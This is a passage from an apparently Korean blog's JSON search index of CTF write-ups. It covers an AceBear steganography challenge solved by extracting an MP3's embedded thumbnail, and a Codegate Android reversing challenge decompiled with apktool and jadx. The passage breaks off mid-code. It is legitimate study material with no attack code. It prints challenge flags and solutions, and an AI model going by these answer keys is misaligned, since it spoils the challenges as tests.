align=\"right\"><strong>AceBear{y0u_l00k_v3ry_pr3tty!}</strong></p>\n\n"
    } ,
  
    {
      "title"    : "[2018_AceBear_CTF] JS (999)",
      "category" : "CTF2018_acebear",
      "tags"     : "Forensic, MISC, javascript, steganography",
      "url"      : "/ctf/2018_acebear/2018/02/09/AceBear-CTF-JS-999/",
      "date"     : "2018-02-09 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Challenge Description: Let listen to the best song of this month.\nDownload: Link\nAuthor: komang4130</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-09-AceBear-CTF-JS-999/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>Forensic/MISC 분야에서 나왔던 문제, 풀이자가 상당히 적고 나도 당시엔 풀지 못한 문제인데.. 너무 어이 없이 해결해서 당황스럽다..</p>\n\n<p>link를 통해서 받은 파일을 확인해보면, mp3 파일을 하나 확인할 수 있다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/JS\n file ./Hey_Stranger.mp3\n./Hey_Stranger.mp3: Audio file with ID3 version 2.4.0\n jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/JS\n exiftool ./Hey_Stranger.mp3\nExifTool Version Number         : 10.55\nFile Name                       : Hey_Stranger.mp3\nDirectory                       : <span class=\"nb\">.</span>\nFile Size                       : 4.7 MB\nFile Modification Date/Time     : 2018:01:27 14:11:55+09:00\nFile Access Date/Time           : 2018:02:08 21:26:36+09:00\nFile Inode Change Date/Time     : 2018:01:27 14:13:20+09:00\nFile Permissions                : rw-r--r--\nFile Type                       : MP3\nFile Type Extension             : mp3\nMIME Type                       : audio/mpeg\nMPEG Audio Version              : 1\nAudio Layer                     : 3\nAudio Bitrate                   : 128 kbps\nSample Rate                     : 44100\nChannel Mode                    : Stereo\nMS Stereo                       : Off\nIntensity Stereo                : Off\nCopyright Flag                  : False\nOriginal Media                  : False\nEmphasis                        : None\nID3 Size                        : 1415670\nCopyright                       : Vega\nTitle                           : Người Lạ Ơi\nGenre                           : Rap / Hip Hop Việt\nArtist                          : Karik, Orange\nAlbum                           :\nUser Defined Text               : <span class=\"o\">(</span>author<span class=\"o\">)</span> Châu Đăng Khoa\nEncoder Settings                : Lavf56.40.101\nPicture MIME Type               : image/png\nPicture Type                    : Other\nPicture Description             : Hey Stranger - Karik - Orange\nPicture                         : <span class=\"o\">(</span>Binary data 1415401 bytes, use <span class=\"nt\">-b</span> option to extract<span class=\"o\">)</span>\nDuration                        : 0:03:37 <span class=\"o\">(</span>approx<span class=\"o\">)</span>\n</code></pre></div></div>\n<p><br /></p>\n\n<p>대회 당시, binary가 mp3 파일로 주어졌기 때문에 MP3stego 등을 이용하거나, Spectrum, GoldWave 등으로 Audio Steganography로 접근했었다. 하지만 전혀 관계없다… <code class=\"highlighter-rouge\">binwalk</code>로 파일 내 데이터를 추출하면, 아래와 같이 Thumbnail로 저장되어 있는 이미지 파일을 하나 확인할 수 있다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/JS\nbinwalk ./Hey_Stranger.mp3\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n<span class=\"nt\">--------------------------------------------------------------------------------</span>\n259           0x103           PNG image, 1366 x 1000, 8-bit/color RGBA, non-interlaced\n300           0x12C           Zlib compressed data, compressed\n4103003       0x3E9B5B        lrzip compressed data\n</code></pre></div></div>\n\n<p><img src=\"/images/2018-02-09-AceBear-CTF-JS-999/info.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] Binwalk information</i></p>\n\n<p>혹시 몰라, 대회 당시엔 해당 png 파일에 대해 추출하고 OpenStego 돌려보고, LSB 확인하고 등의 작업을 많이 수행했었는데 바보 같았던게 문제에서 <code class=\"highlighter-rouge\">JS</code> 라는 단어를 언급하고 있던 점을 전혀 생각하지 않았던 것이다.</p>\n\n<p><code class=\"highlighter-rouge\">javascript</code> image steganography 에 대해서 찾아보니, 바로 관련된 자료가 나왔고.. 해당 thumbnail을 올려 unhide 해보니.. 바로 Flag 확인..(상당히 어이가 없었다.. 풀이자도 2-3팀 정도였던 걸로 기억하는데, 너무 간단한 문제였다..)\n<img src=\"/images/2018-02-09-AceBear-CTF-JS-999/unhide.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] unhide Thumbnail</i></p>\n<p align=\"right\"><strong>AceBear{!!!!!BoA_Luffy_1s_Real!!!!!}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_Codegate_CTF] Welcome to droid (125)",
      "category" : "CTF2018_Codegate",
      "tags"     : "Reversing, android, apk",
      "url"      : "/ctf/2018_codegate/2018/02/06/Codegate-CTF-Welcome-to-droid-125/",
      "date"     : "2018-02-06 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>&gt; o &lt; !<br />\nDownload</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/exercise.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] exercise</i></p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>풀이자가 많아서, 시간 날때 봤던 문제.. 하지만 Smail code 때매 제대로 code 보질 못했는데, 나중에 다른 도구 써보니 잘되서 빡친 문제..</p>\n\n<p>zip 파일을 다운 받을 수 있으며, 압축 해제 시 APK 파일을 하나 확인할 수 있다.\n<img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/apk.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] apk binary</i></p>\n\n<p>ADB에 올려, 먼저 설치를 진행한다. 팀원들이 설치가 제대로 되지 않는다고 했었는데, 별다른 에러 없이 설치가 진행된 것을 확인할 수 있었다.\n<img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/1.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] apk install</i></p>\n\n<p>설치된 apk를 실행시켜 보면, 아래와 같은 id input 항목과 <code class=\"highlighter-rouge\">next</code> 버튼을 확인할 수 있다.\n<img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/2.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] apk execute (MainActivity)</i></p>\n\n<p>아무 값으로 id 항목을 입력하고, next 버튼을 누를 경우 아래와 같이 pw 입력 레이아웃(Main2Activity)으로 전환되는 것을 확인할 수 있으며, password 를 아무값으로 입력하고 next를 눌러 popup되는 문구를 확인할 수 있었다.\n<img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/3.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] apk execute (Main2Activity)</i></p>\n\n<p>주어진 조건을 충족시켜 줘야하는 문제인지, 다른 방식으로 접근해야하는 문제인지 확인해볼 필요가 있다. 이를 위해서, APK를 decompile 할 필요가 있는데 평소에 본인은 <code class=\"highlighter-rouge\">BytecodeViewer</code>를 사용하거나, <code class=\"highlighter-rouge\">apktool + BytecodeViewer</code> 조합으로 APK 분석을 자주하는 편이라 이번에도 동일하게 진행했다.</p>\n\n<blockquote>\n  <p>BytecodeViewer로만 해당 apk를 열 경우, 정상적으로 로드되지 않는다. (Null Point Exception error)</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/bytecodeviewer.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] BytecodeViewer Error</i></p>\n\n<blockquote>\n  <p>따라서, apktool을 이용해 decompile을 먼저 진행하고, BytecodeViewer를 이용해 apk 구성요소들을 살펴보았다. 아래와 같이 smali 가 그대로 적용된 것을 확인할 수 있었는데, 대회 당시에 늦게 참여하고 여러 일정 소화하고 온터라 피곤한 상태에서 성의껏 보지 않은 점이 패인이다…(변명ㅋ)</p>\n  <div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Codegate_CTF/문제백업/[Rev]Welcome to droid\n apktool d ./droid.apk\nI: Using Apktool 2.3.1 on droid.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nS: WARNING: Could not write to <span class=\"o\">(</span>/Users/Mac/Library/apktool/framework<span class=\"o\">)</span>, using /var/folders/t_/3_spx9kn2j1072knxbnnwlvm0000gn/T/ instead...\nS: Please be aware this is a volatile directory and frameworks could go missing, please utilize <span class=\"nt\">--frame-path</span> <span class=\"k\">if </span>the default storage directory is unavailable\nI: Loading resource table from file: /var/folders/t_/3_spx9kn2j1072knxbnnwlvm0000gn/T/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values <span class=\"k\">*</span>/<span class=\"k\">*</span> XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n</code></pre></div>  </div>\n</blockquote>\n\n<p><img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/decompile_smali.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] decompile_smali</i></p>\n\n<p>이게, apktool 로 decompile 했을 땐 smali가 덕지덕지 붙어나와서 영 보기 불편했는데 <code class=\"highlighter-rouge\">jadx-gui</code>를 이용해서 해당 apk를 열었을 땐, 아래와 같이 깔끔하게 Code를 볼 수 있었다..\n<img src=\"/images/2018-02-06-Codegate-CTF-Welcome-to-droid-125/jadx_decompile.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] decompile jadx</i></p>\n\n<p>Code 흐름을 살펴보자, 아래는 MainActivity code 이다. id input 값의 길이를 체크하고, Main2Activity를 호출하는 것을 확인할 수 있다.</p>\n<div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">l</span><span class=\"o\">.</span><span class=\"na\">setText</span><span class=\"o\">(</span><span class=\"s\">\"enter your id\"</span><span class=\"o\">);</span>\n        <span class=\"o\">((</span><span class=\"n\">Button</span><span class=\"o\">)</span> <span class=\"n\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">button2</span><span class=\"o\">)).</span><span class=\"na\">setOnClickListener</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">OnClickListener</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"kd\">final</span> <span class=\"cm\">/* synthetic */</span> <span class=\"n\">MainActivity</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n\n            <span class=\"o\">{</span>\n                <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span> <span class=\"o\">=</span> <span class=\"n\">r1</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span>\n\n            <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">onClick</span><span class=\"o\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">String</span> <span class=\"n\">obj</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">.</span><span class=\"na\">l</span><span class=\"o\">.</span><span class=\"na\">getText</span><span class=\"o\">().</span><span class=\"na\">toString</span><span class=\"o\">();</span>\n                <span class=\"kt\">int</span> <span class=\"n\">length</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">.</span><span class=\"na\">l</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">();</span>\n                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">length</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">10</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">length</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">26</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                    <span class=\"n\">Intent</span> <span class=\"n\">intent</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Intent</span><span class=\"o\">(</span><span class=\"n\">view</span><span class=\"o\">.</span><span class=\"na\">getContext</span><span class=\"o\">(),</span> <span class=\"n\">Main2Activity</span><span class=\"o\">.</span><span class=\"na\">class</span><span class=\"o\">);</span>\n                    <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">\"edittext\"</span><span class=\"o\">,</span> <span class=\"n\">obj</span><span class=\"o\">);</span>\n                    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">.</span><span class=\"na\">startActivity</span><span class=\"o\">(</span><span class=\"n\">intent</span><span class=\"o\">);</span>\n                <span class=\"o\">}</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">});</span>\n</code></pre></div></div>\n<p><br /></p>\n\n<p>Main2Activity로 가보면, 아래와 같이 password 에 대한 value check을 통해서 Main3Activity를 호출하는 것을 확인할 수 있다.</p>\n<div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">l</span><span class=\"o\">.</span><span class=\"na\">setText</span><span class=\"o\">(</span><span class=\"s\">\"enter your password\"</span><span class=\"o\">);</span>\n        <span class=\"kd\">final</span> <span class=\"n\">String</span> <span class=\"n\">stringExtra</span> <span class=\"o\">=</span> <span class=\"n\">getIntent</span><span class=\"o\">().</span><span class=\"na\">getStringExtra</span><span class=\"o\">(</span><span class=\"s\">\"edittext\"</span><span class=\"o\">);</span>\n        <span class=\"o\">((</span><span class=\"n\">Button</span><span class=\"o\">)</span> <span class=\"n\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">button2</span><span class=\"o\">)).</span><span class=\"na\">setOnClickListener</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">OnClickListener</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"kd\">final</span> <span class=\"cm\">/* synthetic */</span> <span class=\"n\">Main2Activity</span> <span class=\"n\">b</span><span class=\"o\">;</span>\n\n            <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">onClick</span><span class=\"o\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">String</span> <span class=\"n\">obj</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">b</span><span class=\"o\">.</span><span class=\"na\">l</span><span class=\"o\">.</span><span class=\"na\">getText</span><span class=\"o\">().</span><span class=\"na\">toString</span><span class=\"o\">();</span>\n                <span class=\"n\">String</span> <span class=\"n\">str</span> <span class=\"o\">=</span> <span class=\"s\">\"\"</span><span class=\"o\">;</span>\n                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">Main2Activity</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">(</span><span class=\"n\">stringExtra</span><span class=\"o\">).</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">obj</span><span class=\"o\">))</span> <span class=\"o\">{</span>\n                    <span class=\"n\">Intent</span> <span class=\"n\">intent</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Intent</span><span class=\"o\">(</span><span class=\"n\">view</span><span class=\"o\">.</span><span class=\"na\">getContext</span><span class=\"o\">(),</span> <span class=\"n\">Main3Activity</span><span class=\"o\">.</span><span class=\"na\">class</span><span class=\"o\">);</span>\n                    <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">\"id\"</span><span class=\"o\">,</span> <span class=\"n\">stringExtra</span><span class=\"o\">);</span>\n                    <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">\"pass\"</span><span class=\"o\">,</span> <span class=\"n\">obj</span><span class=\"o\">);</span>\n                    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">b</span><span class=\"o\">.</span><span class=\"na\">startActivity</span><span class=\"o\">(</span><span class=\"n\">intent</span><span class=\"o\">);</span>\n                    <span class=\"k\">return</span><span class=\"o\">;</span>\n                <span class=\"o\">}</span>\n                <span class=\"o\">((</span><span class=\"n\">TextView</span><span class=\"o\">)</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">b</span><span class=\"o\">.</span><span class=\"na\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">sample_text</span><span class=\"o\">)).</span><span class=\"na\">setText</span><span class=\"o\">(</span><span class=\"s\">\"wrong! try again\"</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">});</span>\n</code></pre></div></div>\n<p><br /></p>\n\n<p>Main3Activity로 가보면, 아래와 같이 serial key에 대한 value check을 통해서 Main4Activity를 호출하는 것을 확인할 수 있다. k method로부터 생성되는 문자열과 비교를 하는 과정이 포함되어 있는데, radom string이 generate 되는 것을 확인할 수 있다.</p>\n<div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Main3Activity</span> <span class=\"kd\">extends</span> <span class=\"n\">c</span> <span class=\"o\">{</span>\n    <span class=\"n\">EditText</span> <span class=\"n\">l</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">k</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">cArr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">char</span><span class=\"o\">[]{</span><span class=\"sc\">'a'</span><span class=\"o\">,</span> <span class=\"sc\">'b'</span><span class=\"o\">,</span> <span class=\"sc\">'c'</span><span class=\"o\">,</span> <span class=\"sc\">'d'</span><span class=\"o\">,</span> <span class=\"sc\">'e'</span><span class=\"o\">,</span> <span class=\"sc\">'f'</span><span class=\"o\">,</span> <span class=\"sc\">'g'</span><span class=\"o\">,</span> <span class=\"sc\">'h'</span><span class=\"o\">,</span> <span class=\"sc\">'i'</span><span class=\"o\">,</span> <span class=\"sc\">'j'</span><span class=\"o\">,</span> <span class=\"sc\">'k'</span><span class=\"o\">,</span> <span class=\"sc\">'l'</span><span class=\"o\">,</span> <span class=\"sc\">'m'</span><span class=\"o\">,</span> <span class=\"sc\">'n'</span><span class=\"o\">,</span> <span class=\"sc\">'o'</span><span class=\"o\">,</span> <span class=\"sc\">'p'</span><span class=\"o\">,</span> <span class=\"sc\">'q'</span><span class=\"o\">,</span> <span class=\"sc\">'r'</span><span class=\"o\">,</span> <span class=\"sc\">'s'</span><span class=\"o\">,</span> <span class=\"sc\">'t'</span><span class=\"o\">,</span> <span class=\"sc\">'u'</span><span class=\"o\">,</span> <span class=\"sc\">'v'</span><span class=\"o\">,</span> <span class=\"sc\">'w'</span><span class=\"o\">,</span> <span class=\"sc\">'x'</span><span class=\"o\">,</span> <span class=\"sc\">'y'</span><span class=\"o\">,</span> <span class=\"sc\">'z'</span><span class=\"o\">,</span> <span class=\"sc\">'0'</span><span class=\"o\">,</span> <span class=\"sc\">'1'</span><span class=\"o\">,</span> <span class=\"sc\">'2'</span><span class=\"o\">,</span> <span class=\"sc\">'3'</span><span class=\"o\">,</span> <span class=\"sc\">'4'</span><span class=\"o\">,</span> <span class=\"sc\">'5'</span><span class=\"o\">,</span> <span class=\"sc\">'6'</span><span class=\"o\">,</span> <span class=\"sc\">'7'</span><span class=\"o\">,</span> <span class=\"sc\">'8'</span><span class=\"o\">,</span> <span class=\"sc\">'9'</span><span class=\"o\">};</span>\n        <span class=\"n\">StringBuffer</span> <span class=\"n\">stringBuffer</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">StringBuffer</span><span class=\"o\">();</span>\n        <span class=\"n\">Random</span> <span class=\"n\">random</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Random</span><span class=\"o\">();</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"mi\">20</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">stringBuffer</span><span class=\"o\">.</span><span class=\"na\">append</span><span class=\"o\">(</span><span class=\"n\">cArr</span><span class=\"o\">[</span><span class=\"n\">random</span><span class=\"o\">.</span><span class=\"na\">nextInt</span><span class=\"o\">(</span><span class=\"n\">cArr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">)]);</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">return</span> <span class=\"n\">stringBuffer</span><span class=\"o\">.</span><span class=\"na\">toString</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">protected</span> <span class=\"kt\">void</span> <span class=\"nf\">onCreate</span><span class=\"o\">(</span><span class=\"n\">Bundle</span> <span class=\"n\">bundle</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">onCreate</span><span class=\"o\">(</span><span class=\"n\">bundle</span><span class=\"o\">);</span>\n        <span class=\"n\">setContentView</span><span class=\"o\">((</span><span class=\"kt\">int</span><span class=\"o\">)</span> <span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">layout</span><span class=\"o\">.</span><span class=\"na\">activity_main3</span><span class=\"o\">);</span>\n        <span class=\"n\">a</span><span class=\"o\">((</span><span class=\"n\">Toolbar</span><span class=\"o\">)</span> <span class=\"n\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">toolbar</span><span class=\"o\">));</span>\n        <span class=\"o\">((</span><span class=\"n\">FloatingActionButton</span><span class=\"o\">)</span> <span class=\"n\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">fab</span><span class=\"o\">)).</span><span class=\"na\">setOnClickListener</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">OnClickListener</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"kd\">final</span> <span class=\"cm\">/* synthetic */</span> <span class=\"n\">Main3Activity</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n\n            <span class=\"o\">{</span>\n                <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span> <span class=\"o\">=</span> <span class=\"n\">r1</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span>\n\n            <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">onClick</span><span class=\"o\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">Snackbar</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">(</span><span class=\"n\">view</span><span class=\"o\">,</span> <span class=\"s\">\"Replace with your own action\"</span><span class=\"o\">,</span> <span class=\"mi\">0</span><span class=\"o\">).</span><span class=\"na\">a</span><span class=\"o\">(</span><span class=\"s\">\"Action\"</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">).</span><span class=\"na\">a</span><span class=\"o\">();</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">});</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">MainActivity</span><span class=\"o\">.</span><span class=\"na\">k</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n            <span class=\"o\">((</span><span class=\"n\">TextView</span><span class=\"o\">)</span> <span class=\"n\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">sample_text</span><span class=\"o\">)).</span><span class=\"na\">setText</span><span class=\"o\">(</span><span class=\"s\">\"hi there\"</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">TextView</span> <span class=\"n\">textView</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">TextView</span><span class=\"o\">)</span> <span class=\"n\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">sample_text</span><span class=\"o\">);</span>\n            <span class=\"n\">finishAffinity</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">l</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">EditText</span><span class=\"o\">)</span> <span class=\"n\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">editText</span><span class=\"o\">);</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">l</span><span class=\"o\">.</span><span class=\"na\">setText</span><span class=\"o\">(</span><span class=\"s\">\"type serial key\"</span><span class=\"o\">);</span>\n        <span class=\"o\">((</span><span class=\"n\">Button</span><span class=\"o\">)</span> <span class=\"n\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">button2</span><span class=\"o\">)).</span><span class=\"na\">setOnClickListener</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">OnClickListener</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"kd\">final</span> <span class=\"cm\">/* synthetic */</span> <span class=\"n\">Main3Activity</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n\n            <span class=\"o\">{</span>\n                <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span> <span class=\"o\">=</span> <span class=\"n\">r1</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span>\n\n            <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">onClick</span><span class=\"o\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">.</span><span class=\"na\">k</span><span class=\"o\">().</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">.</span><span class=\"na\">l</span><span class=\"o\">.</span><span class=\"na\">getText</span><span class=\"o\">().</span><span class=\"na\">toString</span><span class=\"o\">()))</span> <span class=\"o\">{</span>\n                    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">.</span><span class=\"na\">startActivity</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">Intent</span><span class=\"o\">(</span><span class=\"n\">view</span><span class=\"o\">.</span><span class=\"na\">getContext</span><span class=\"o\">(),</span> <span class=\"n\">Main4Activity</span><span class=\"o\">.</span><span class=\"na\">class</span><span class=\"o\">));</span>\n                    <span class=\"k\">return</span><span class=\"o\">;</span>\n                <span class=\"o\">}</span>\n                <span class=\"o\">((</span><span class=\"n\">TextView</span><span class=\"o\">)</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">a</span><span class=\"o\">.</span><span class=\"na\">findViewById</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">.</span><span class=\"na\">sample_text</span><span class=\"o\">)).</span><span class=\"na\">setText</span><span class=\"o\">(</span><span class=\"s\">\"wrong! try again\"</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">});</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n\n<p><br />\n아래는 Main4Activity Code이다. 결과적으로 Main3Activity 까지 입력한 ID, PW, Serial key가 check에 부합되는 경우 Main4Activity를 호출하는 구조인데, 자세히 보면, <code class=\"highlighter-rouge\">this.l.setText(stringFromJNI());</code>에서 JNI()를 통해 호출한 값을 setText 를 통해서 뿌려주는 것을 확인할 수 있다.</p>\n<div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Main4Activity</span> <span class=\"kd\">extends</span> <span class=\"n\">c</span> <span class=\"o\">{</span>\n    <span class=\"n\">EditText</span> <span class=\"n\">l</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">protected</span> <span class=\"kt\">void</span> <span class=\"nf\">onCreate</span><span class=\"o\">(</span><span class=\"n\">Bundle</span> <span 